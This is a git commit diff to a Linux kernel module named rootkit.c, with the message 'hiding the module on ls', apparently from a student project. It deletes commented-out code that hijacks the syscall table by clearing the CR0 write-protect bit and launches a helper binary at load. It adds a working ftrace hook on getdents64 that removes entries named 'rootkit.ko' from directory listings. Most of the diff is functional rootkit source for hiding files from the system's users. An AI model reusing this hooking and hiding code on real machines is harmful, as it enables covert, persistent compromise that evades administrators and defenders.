00345e486e43e51b812c18c8ca6621a02a45d97a
Devsstudent <devsstudent777@gmail.com>
2024-11-11 20:53:37 +0100

    hiding the module on ls

--- src/rootkit.c
+++ src/rootkit.c
@@ -1,128 +1,3 @@
-//#include <linux/init.h>
-//#include <linux/module.h>
-//#include <linux/syscalls.h>
-//#include <linux/kernel.h>
-//#include <linux/kallsyms.h>
-//#include <asm/unistd.h>
-//#include <linux/smp.h>
-//#include <linux/preempt.h>
-//
-//static unsigned long *sys_call_table = NULL;
-//static asmlinkage long (*original_call)(const struct pt_regs *);
-
-//static asmlinkage long myGetDents(const struct pt_regs *regs) {
-//    long ret = original_call(regs);
-//    printk(KERN_INFO "Syscall was called\n");
-//    return ret;
-//}
-//
-//static unsigned long orig_cr0;
-//
-//static inline void unprotect_memory(void) {
-//    unsigned long cr0;
-//    preempt_disable();        // Disable preemption
-//    barrier();                // Memory barrier
-//    cr0 = read_cr0();
-//    orig_cr0 = cr0;
-//    cr0 &= ~X86_CR0_WP;      // Clear WP bit
-//    barrier();                // Memory barrier
-//    write_cr0(cr0);
-//    barrier();                // Memory barrier
-//}
-//
-//static inline void protect_memory(void) {
-//    barrier();                // Memory barrier
-//    write_cr0(orig_cr0);
-//    barrier();                // Memory barrier
-//    preempt_enable();         // Re-enable preemption
-//}
-//
-///* Current solution would be to allow kallsyms_lookup_name in our Kernel, for the moment, and they maybe disable it and see how we can still have the same behavior
-// *
-// *  https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
-// * */
-//
-//static unsigned long **find_sys_call_table(void) {
-//    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
-//}
-////static unsigned long **find_sys_call_table(void) {
-////    unsigned long offset = PAGE_OFFSET;
-////    unsigned long **sct;
-////
-////    while (offset < ULLONG_MAX) {
-////        sct = (unsigned long **)offset;
-////        if (sct[__NR_close] == (unsigned long ) sys_close) 
-////            return sct;
-////        offset += sizeof(void *);
-////    }
-////    return NULL;
-////}
-////
-//
-//
-//static int hooking_syscall(void *hook_addr, uint16_t syscall_offset, unsigned long *sys_call_table)
-//{
-//    if (!hook_addr || !sys_call_table)
-//        return -EINVAL;
-//
-//    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
-//    printk(KERN_INFO "Original address: %px\n", (void*)sys_call_table[syscall_offset]);
-//    
-//    unprotect_memory();
-//    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
-//    protect_memory();
-//    
-//    printk(KERN_INFO "New address: %px\n", (void*)sys_call_table[syscall_offset]);
-//    return 0;
-//}
-//
-//static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
-//{
-//	unprotect_memory();
-//	sys_call_table[syscall_offset] = (unsigned long)orig_addr;
-//	protect_memory();
-//}
-//
-//static int __init rootkit_init(void) {
-//
-//    int ret;
-//    
-//    sys_call_table = (unsigned long*)find_sys_call_table();
-//    if (!sys_call_table) {
-//        printk(KERN_ERR "Failed to find syscall table\n");
-//        return -EFAULT;
-//    }
-//
-//    original_call = (void *)sys_call_table[__NR_getdents];
-//    if (!original_call) {
-//        printk(KERN_ERR "Failed to save original syscall\n");
-//        return -EFAULT;
-//    }
-//
-//
-//    ret = hooking_syscall(myGetDents, __NR_getdents, sys_call_table);
-//    if (ret < 0) {
-//        printk(KERN_ERR "Failed to hook syscall\n");
-//        return ret;
-//    }
-//    printk(KERN_INFO "Rootkit has been loaded\n");
-//    char *argv[] = {"/start_companion", NULL};
-//    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-//
-//    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-//    printk("%i\n", r);
-//    return 0;
-//}
-//
-//static void rootkit_exit(void) {
-//    unhooking_syscall(original_call, __NR_getdents);
-//    printk(KERN_INFO "Rootkit has been unloaded\n");
-//}
-//
-//module_init(rootkit_init);
-//module_exit(rootkit_exit);
-//
-//MODULE_LICENSE("GPL");
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
@@ -133,7 +8,13 @@
 #include <linux/preempt.h>
 #include <linux/vmalloc.h>
 #include <linux/ftrace.h>
+#include <linux/dirent.h>
+#include <linux/fs.h>
+#include <linux/string.h>
+#include <linux/file.h>
+#include <linux/stat.h>
 
+// https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
 struct ftrace_hook {
@@ -216,19 +97,168 @@ static void fh_remove_hook(struct ftrace_hook *hook)
 
 static asmlinkage long (*original_call)(const struct pt_regs *);
 
-static asmlinkage long myGetDents(const struct pt_regs *regs) {
-//    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->di;
-    printk(KERN_INFO "Syscall was called\n");
-    long ret = original_call(regs);
-    printk(KERN_INFO "Syscall was called\n");
-    return ret;
+// Original getdents64 syscall :
+/*
+  struct getdents_callback64 {
+	  struct dir_context ctx;
+  	struct linux_dirent64 __user * current_dir;
+	  int prev_reclen;
+	  int count;
+	  int error;
+  };
+
+static int verify_dirent_name(const char *name, int len)
+{
+	if (len <= 0 || len >= PATH_MAX)
+		return -EIO;
+	if (memchr(name, '/', len))
+		return -EIO;
+	return 0;
 }
+
+#define unsafe_copy_dirent_name(_dst, _src, _len, label) do {	\
+	char __user *dst = (_dst);				\
+	const char *src = (_src);				\
+	size_t len = (_len);					\
+	unsafe_put_user(0, dst+len, label);			\
+	unsafe_copy_to_user(dst, src, len, label);		\
+} while (0)
+
+static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type)
+{
+	struct linux_dirent64 __user *dirent, *prev;
+	struct getdents_callback64 *buf =
+		container_of(ctx, struct getdents_callback64, ctx);
+	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
+		sizeof(u64));
+	int prev_reclen;
+
+	buf->error = verify_dirent_name(name, namlen);
+	if (unlikely(buf->error))
+		return false;
+	buf->error = -EINVAL;	 only used if we fail.. 
+	if (reclen > buf->count)
+		return false;
+	prev_reclen = buf->prev_reclen;
+	if (prev_reclen && signal_pending(current))
+		return false;
+	dirent = buf->current_dir;
+	prev = (void __user *)dirent - prev_reclen;
+	if (!user_write_access_begin(prev, reclen + prev_reclen))
+		goto efault;
+
+	 This might be 'dirent->d_off', but if so it will get overwritten 
+	unsafe_put_user(offset, &prev->d_off, efault_end);
+	unsafe_put_user(ino, &dirent->d_ino, efault_end);
+	unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
+	unsafe_put_user(d_type, &dirent->d_type, efault_end);
+	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
+	user_write_access_end();
+
+	buf->prev_reclen = reclen;
+	buf->current_dir = (void __user *)dirent + reclen;
+	buf->count -= reclen;
+	return true;
+
+efault_end:
+	user_write_access_end();
+efault:
+	buf->error = -EFAULT;
+	return false;
+}
+
+getdent64 {
+	  struct fd f;
+	  struct getdents_callback64 buf = {
+	  	.ctx.actor = filldir64,
+	  	.count = count,
+	  	.current_dir = dirent
+	  };
+
+	  int error;
+
+	  f = fdget_pos(fd);
+	  if (!f.file)
+	  	return -EBADF;
+
+	  error = iterate_dir(f.file, &buf.ctx);
+	  if (error >= 0)
+	  	error = buf.error;
+	  if (buf.prev_reclen) {
+	  	struct linux_dirent64 __user * lastdirent;
+	  	typeof(lastdirent->d_off) d_off = buf.ctx.pos;
+
+	  	lastdirent = (void __user *) buf.current_dir - buf.prev_reclen;
+	  	if (put_user(d_off, &lastdirent->d_off))
+	  		error = -EFAULT;
+	  	else
+	  		error = count - buf.count;
+	  }
+	  fdput_pos(f);
+	  return error;
+}
+
+
+
+*/
+/*
+ * di -> FD
+ * si -> struct dirent
+ * dx -> count, taille de buffer %di
+*/
+static asmlinkage long myGetDents(const struct pt_regs *regs) {
+
+    printk(KERN_INFO "Hello there\n");
+    int dirent_idx = 0;
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
+    struct linux_dirent64* dirent_buff;
+//   long int          count = regs->dx;
+//    long unsigned int fd = regs->di;
+
+    struct linux_dirent64* dirent_buff_prev = NULL;
+
+    int getdent_ret = original_call(regs);
+
+    if (getdent_ret <= 0) {
+        return getdent_ret;
+    }
+    void *dbuf = (void *)(dirent);
+  //array of "string to hide"
+    int to_hide = 0;
+
+    while (dirent_idx + to_hide < getdent_ret) {
+      dirent_buff = (struct linux_dirent64 *)(dbuf + dirent_idx);
+//      printk(KERN_INFO "|%i| %i \n", getdent_ret, dirent_buff->d_reclen);
+      if (strstr(dirent_buff->d_name, "rootkit.ko") != NULL) {
+          to_hide += dirent_buff->d_reclen;
+          //Copy 
+          memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
+      } else {
+        dirent_buff_prev = dirent_buff;
+        dirent_idx += dirent_buff->d_reclen;
+      }
+
+    /*
+   printf("%-10s ", (d_type == DT_REG) ?  "regular" :
+   (d_type == DT_DIR) ?  "directory" :
+   (d_type == DT_FIFO) ? "FIFO" :
+   (d_type == DT_SOCK) ? "socket" :
+   (d_type == DT_LNK) ?  "symlink" :
+   (d_type == DT_BLK) ?  "block dev" :
+   (d_type == DT_CHR) ?  "char dev" : "???");
+    */
+  }
+	return dirent_idx - to_hide;
+}
+
+
 
 static  struct ftrace_hook f_hook = {
     .name = "__x64_sys_getdents64",
     .function = (myGetDents),
     .original = (&original_call),
-  };
+};
 
 static int __init rootkit_init(void) {
     if (fh_install_hook(&f_hook)) {
@@ -246,133 +276,3 @@ static void __exit rootkit_exit(void) {
 module_init(rootkit_init);
 module_exit(rootkit_exit);
 MODULE_LICENSE("GPL");
-
-//static inline void write_cr0_force(unsigned long val) {
-//    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
-//}
-//
-//static inline void protect_memory(void) {
-//    write_cr0_force(read_cr0() | (1 << 16));
-//}
-//
-//static inline void unprotect_memory(void) {
-//    write_cr0_force(read_cr0() & (~(1 << 16)));
-//}
-
-//static int make_rw(unsigned long address) {
-//    unsigned int level;
-//    pte_t *pte = lookup_address(address, &level);
-//    if (pte == NULL) 
-//        return -1;
-//    if (pte->pte & ~_PAGE_RW) 
-//        pte->pte |= _PAGE_RW;
-//    return 0;
-//}
-//
-//static int make_ro(unsigned long address) {
-//    unsigned int level;
-//    pte_t *pte = lookup_address(address, &level);
-//    if (pte == NULL)
-//        return -1;
-//    pte->pte = pte->pte & ~_PAGE_RW;
-//    return 0;
-//}
-
-//static void hooking_syscall(void *hook_addr, uint16_t syscall_offset)
-//{
-//    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
-//    printk(KERN_INFO "Original address: %px\n", ((void *)sys_call_table[syscall_offset]));
-//    
-//    make_rw((unsigned long)sys_call_table);
-//    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
-//    make_ro((unsigned long)sys_call_table);
-//    
-//    printk(KERN_INFO "New address: %px\n", ((void *)sys_call_table[syscall_offset]));
-//}
-
-//static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
-//{
-//    make_rw((unsigned long)sys_call_table);
-//    sys_call_table[syscall_offset] = (unsigned long)orig_addr;
-//    make_ro((unsigned long)sys_call_table);
-//}
-// For modern kernels we need this to find kernel symbols
-//
-//// CR0 write protection bypass
-//static unsigned long original_cr0;
-//
-//static inline void write_cr0_forced(unsigned long val)
-//{
-//    unsigned long __force_order;
-//
-//    asm volatile(
-//        "mov %0, %%cr0"
-//        : "+r"(val), "+m"(__force_order));
-//}
-//
-//static void disable_write_protect(void)
-//{
-//    original_cr0 = read_cr0();
-//    write_cr0_forced(original_cr0 & ~0x00010000);
-//}
-//
-//static void enable_write_protect(void)
-//{
-//    write_cr0_forced(original_cr0);
-//}
-//
-//// Your original syscall function pointer
-//static asmlinkage long (*original_syscall)(const struct pt_regs *);
-//
-//// Your hook function
-//static asmlinkage long hook_syscall(const struct pt_regs *regs)
-//{
-//    // Your hook implementation here
-//    return original_syscall(regs);
-//}
-//
-//static int __init rootkit_init(void)
-//{
-//    // Find syscall table address using kallsyms
-//    sys_call_table = (unsigned long**)lookup_name("sys_call_table");
-//    
-//    if (!sys_call_table) {
-//        printk(KERN_INFO "Failed to find syscall table\n");
-//        return -1;
-//    }
-//
-//    printk(KERN_INFO "Found syscall table at %px\n", sys_call_table);
-//
-//    // Save original syscall
-//    original_syscall = (void*)sys_call_table[__NR_mkdir]; // Replace with actual syscall number
-//
-//    // Disable write protection
-//    disable_write_protect();
-//    
-//    // Replace with our hook
-//    sys_call_table[__NR_mkdir] = (unsigned long*)hook_syscall;
-//    
-//    // Re-enable write protection
-//    enable_write_protect();
-//
-//    return 0;
-//}
-//
-//static void __exit rootkit_exit(void)
-//{
-//    if (sys_call_table) {
-//        // Disable write protection
-//        disable_write_protect();
-//        
-//        // Restore original syscall
-//        sys_call_table[__NR_mkdir] = (unsigned long*)original_syscall;
-//        
-//        // Re-enable write protection
-//        enable_write_protect();
-//    }
-//    
-//    printk(KERN_INFO "Module unloaded\n");
-//}
-//
-//module_init(rootkit_init);
-//module_exit(rootkit_exit);
